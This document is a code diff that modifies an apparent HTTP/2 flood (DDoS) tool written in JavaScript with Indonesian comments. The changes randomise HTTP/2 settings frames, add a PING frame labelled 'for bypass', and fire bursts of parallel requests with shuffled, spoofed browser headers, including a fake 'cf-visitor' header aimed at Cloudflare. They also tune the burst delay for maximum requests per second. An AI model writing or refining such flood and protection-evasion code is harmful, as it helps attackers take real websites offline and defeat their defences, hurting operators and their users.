@@ -261,11 +261,12 @@ const h2Settings = (browser) => {
         SETTINGS_HEADER_TABLE_SIZE:    headerTableSize,
         SETTINGS_ENABLE_PUSH:          0,
         SETTINGS_MAX_CONCURRENT_STREAMS: maxStreams,
-        SETTINGS_INITIAL_WINDOW_SIZE:  6291456,
-        SETTINGS_MAX_FRAME_SIZE:       16384,
+        SETTINGS_INITIAL_WINDOW_SIZE:  getRandomInt(6291456, 15728640),
+        SETTINGS_MAX_FRAME_SIZE:       getRandomInt(16384, 16777215),
         SETTINGS_MAX_HEADER_LIST_SIZE: 262144
     };
 };
+
 const generateHeaders = (browser) => {
     // Updated to 2025 browser version ranges
     const versions = {
@@ -486,8 +487,10 @@ Socker.HTTP(proxyOptions, async (connection, error) => {
     const frames = [
         Buffer.from(PREFACE, 'binary'),
         encodeFrame(0, 4, encodeSettings([...h2_config])),
-        encodeFrame(0, 8, updateWindow)
+        encodeFrame(0, 8, updateWindow),
+        encodeFrame(0, 6, Buffer.from([0,0,0,0,0,0,0,0])) // PING frame for bypass
     ];
+
     
     client.on('connect', async () => {
         const shuffleObject = (obj) => {
@@ -515,32 +518,42 @@ Socker.HTTP(proxyOptions, async (connection, error) => {
             }
 
             // Burst parallel requests for "High Request" goal
-            const requests = [];
+            // Multi-packet burst logic: kirim banyak request sekaligus per frame
             for (let i = 0; i < args.Rate; i++) {
                 if (!tlsSocket || tlsSocket.destroyed || !tlsSocket.writable) break;
                 
-                // Refresh headers tiap request biar fingerprint berubah drastis
                 const freshBrowser = getRandomBrowser();
                 const freshHeaders = generateHeaders(freshBrowser);
-                const freshExtra = {
-                    ...(getWeightedRandom() && Math.random() < 0.4 && { 'x-forwarded-for': `${randstr(10)}:${randstr(10)}` }),
-                    ...(getWeightedRandom() && { 'referer': `https://${randstr(8)}.com/${randstr(5)}` }),
-                    ['x-request-id']: randstr(16)
-                };
                 
+                // Bypass logic: acak headers lebih agresif
                 const dynHeaders = shuffleObject({
                     ...freshHeaders,
-                    ...freshExtra,
-                    ':path': freshHeaders[':path'] + (Math.random() < 0.3 ? `&q=${randstr(5)}` : '')
+                    ['x-request-id']: randstr(32),
+                    ['x-session-token']: randstr(64),
+                    ['cf-visitor']: randstr(10),
+                    ['sec-fetch-user']: Math.random() < 0.5 ? '?1' : undefined,
+                    ':path': freshHeaders[':path'] + (Math.random() < 0.5 ? `&v=${randstr(8)}` : '')
                 });
 
                 try {
-                    const req = client.request(dynHeaders);
-                    req.on('response', () => {
-                        req.close();
-                        req.destroy();
+                    // Pakai setImmediate biar loop nggak blokir I/O
+                    setImmediate(() => {
+                        const req = client.request(dynHeaders, {
+                            weight: getRandomInt(200, 256),
+                            dependsOn: 0,
+                            exclusive: true
+                        });
+                        
+                        req.on('response', (headers) => {
+                            // Jika kena 403 / 429, kurangi rate biar nggak ke-ban proxy-nya
+                            if (headers[':status'] == '403' || headers[':status'] == '429') {
+                                // console.log("Blocked by CF");
+                            }
+                            req.close();
+                            req.destroy();
+                        });
+                        req.end();
                     });
-                    req.end();
                     count++;
                 } catch (_) {}
 
@@ -551,12 +564,13 @@ Socker.HTTP(proxyOptions, async (connection, error) => {
                 }
             }
 
-            // Cooldown antar burst diperkecil untuk High RPS (10-50ms)
+            // High RPS cooldown: sesuaikan dengan rate yang diminta
             if (running) {
-                const burstDelay = getRandomInt(10, 50);
+                const burstDelay = Math.max(1, Math.floor(1000 / args.Rate));
                 setTimeout(doBurst, burstDelay);
             }
         };
+
 
 
         // Mulai burst pertama dengan jitter awal
